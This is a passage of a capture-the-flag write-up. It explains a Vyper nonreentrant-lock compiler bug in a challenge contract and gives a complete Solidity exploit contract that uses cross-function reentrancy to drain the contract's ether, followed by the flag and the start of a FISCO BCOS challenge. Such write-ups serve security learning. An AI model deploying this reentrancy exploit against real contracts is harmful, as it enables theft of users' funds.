&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;raw_call&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;value &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span&gt;amount)
&lt;&#x2F;span&gt;&lt;span&gt;        increase&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;uint256 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;amount &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;* self.&lt;&#x2F;span&gt;&lt;span&gt;ratio
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;self.&lt;&#x2F;span&gt;&lt;span&gt;balances[out_index][msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span&gt;increase &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ BONUS
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        _before&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;uint256 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;ERC20&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;self.&lt;&#x2F;span&gt;&lt;span&gt;coins[in_index])&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;value &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;raw_call&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;value)
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;ERC20&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;self.&lt;&#x2F;span&gt;&lt;span&gt;coins[in_index])&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;transferFrom&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;amount)
&lt;&#x2F;span&gt;&lt;span&gt;        _after&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;uint256 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;ERC20&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;self.&lt;&#x2F;span&gt;&lt;span&gt;coins[in_index])&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;        increase&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;uint256 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;(_after &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span&gt;_before) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&#x2F; self.&lt;&#x2F;span&gt;&lt;span&gt;ratio
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;self.&lt;&#x2F;span&gt;&lt;span&gt;balances[out_index][msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span&gt;increase
&lt;&#x2F;span&gt;&lt;span&gt;    
&lt;&#x2F;span&gt;&lt;span&gt;    log &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Swap&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;self.&lt;&#x2F;span&gt;&lt;span&gt;coins[in_index]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;self.&lt;&#x2F;span&gt;&lt;span&gt;coins[out_index]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;amount)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;@&lt;&#x2F;span&gt;&lt;span&gt;external
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;@&lt;&#x2F;span&gt;&lt;span&gt;view
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;isSolved&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;-&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;return self.&lt;&#x2F;span&gt;&lt;span&gt;balance &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;In the initial state, the balance of VETH is 0 while the Viper has &lt;code&gt;3 eth&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Referrence to &lt;a href=&quot;https:&#x2F;&#x2F;hackmd.io&#x2F;@vyperlang&#x2F;HJUgNMhs2#Vulnerability-Introduced-Malfunctioning-Re-Entrancy-Locks-in-v0215&quot;&gt;Vyper Nonreentrancy Lock Vulnerability Technical Post-Mortem Report - HackMD&lt;&#x2F;a&gt;，the vulnerability arises from how the &lt;code&gt;storage_slot&lt;&#x2F;code&gt; offsets of re-entrancy keys were ignoring the actual &lt;code&gt;&amp;lt;key&amp;gt;&lt;&#x2F;code&gt; of the &lt;code&gt;@nonreentrant(&amp;lt;key&amp;gt;)&lt;&#x2F;code&gt; decorator and were simply reserving a new slot for each seen &lt;code&gt;@nonreentrant&lt;&#x2F;code&gt; decorator regardless of what “key” was utilized, leading to &lt;code&gt;cross-function reentrance&lt;&#x2F;code&gt; 。&lt;&#x2F;p&gt;
&lt;p&gt;Then dive into the code:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;VETH.sol implement a simple token contract by importing &lt;code&gt;ERC20&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;the address of deployed VETH contract would be passed to &lt;code&gt;initialize&lt;&#x2F;code&gt; function of Viper, as a token conversion target&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Viper contract has following callable function:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;deposit&lt;&#x2F;strong&gt; | index 0 for deposit ETH, index 1 for deposit VETH token&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;withdraw&lt;&#x2F;strong&gt; | index 0 for withdraw ETH, index 1 for deposit VETH token&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;swap&lt;&#x2F;strong&gt; | index 0,1 for converse ETH to VETH token, index 1,0 for converse VETH token to ETH&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Simply noted that the implement of these function are not based on &lt;code&gt;Checks, Effects, and Interactions&lt;&#x2F;code&gt;, which means its exploitable.&lt;&#x2F;p&gt;
&lt;p&gt;Taking advantage of the reentrancy vulnerability, during the process of exchanging VETH token for ETH, VETH token is stored in the Viper contract. While increasing Viper’s VETH balance, it also increases the VETH and ETH balances of one’s own account in viper.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;js&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-js &quot;&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;interface Viper &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;deposit&lt;&#x2F;span&gt;&lt;span&gt;(int128&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;uint256) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;external payable &lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;withdraw&lt;&#x2F;span&gt;&lt;span&gt;(int128&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;uint256) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;external &lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;swap&lt;&#x2F;span&gt;&lt;span&gt;(int128&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;int128&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;uint256) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;external payable &lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;isSolved&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;view external returns &lt;&#x2F;span&gt;&lt;span&gt;(bool)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;interface VETH &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;approve&lt;&#x2F;span&gt;&lt;span&gt;(address&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;uint256) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;external payable &lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;contract exp {
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    Viper public viper &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Viper&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x6A933E75E415e0E56455f44dD0e486B3258F89a0&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#d8dee9;&quot;&gt;VETH &lt;&#x2F;span&gt;&lt;span&gt;public veth &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;VETH&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x692ab1BA329Dd0CAdDffF1c23FfCC3614375aE69&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 public count&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;() payable {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; 4 ether
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;go&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        veth&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;approve&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(viper)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;type&lt;&#x2F;span&gt;&lt;span&gt;(uint256)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;max)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        viper&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;swap{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#5e81ac;&quot;&gt;value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;3 &lt;&#x2F;span&gt;&lt;span&gt;ether}(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;3 &lt;&#x2F;span&gt;&lt;span&gt;ether)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        viper&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;withdraw&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;6 &lt;&#x2F;span&gt;&lt;span&gt;ether)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        viper&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;swap{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#5e81ac;&quot;&gt;value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1 &lt;&#x2F;span&gt;&lt;span&gt;wei}(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        viper&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;withdraw&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;6 &lt;&#x2F;span&gt;&lt;span&gt;ether)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        viper&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;swap&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;6 &lt;&#x2F;span&gt;&lt;span&gt;ether)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        viper&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;withdraw&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;6 &lt;&#x2F;span&gt;&lt;span&gt;ether)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;receive&lt;&#x2F;span&gt;&lt;span&gt;() external payable {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(count&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;==&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;            count&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;++&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            viper&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;deposit&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;6 &lt;&#x2F;span&gt;&lt;span&gt;ether)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;Solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-Solidity &quot;&gt;&lt;code class=&quot;language-Solidity&quot; data-lang=&quot;Solidity&quot;&gt;&lt;span&gt;ACTF{8EW@rE_0F_vEnom0us_sNaK3_81T3$_as_1t_HA$_nO_cOnSc1ENCe}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;amop-1&quot;&gt;AMOP 1&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;yaml&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-yaml &quot;&gt;&lt;code class=&quot;language-yaml&quot; data-lang=&quot;yaml&quot;&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;Description&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;FISCO BCOS is a blockchain that allows you to pass messages.
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;Service&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Access 120.46.58.72:30201 for the channel endpoint.
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The official document of &lt;code&gt;FISCO BCOS&lt;&#x2F;code&gt; was written badly while using abbreviation and full name represent two different versions with incomplete description. Fortunately the &lt;code&gt;usage&lt;&#x2F;code&gt; of &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;FISCO-BCOS&#x2F;java-sdk-demo&quot;&gt;SDK&lt;&#x2F;a&gt; is enough to solve this challenge.&lt;&#x2F;p&gt;
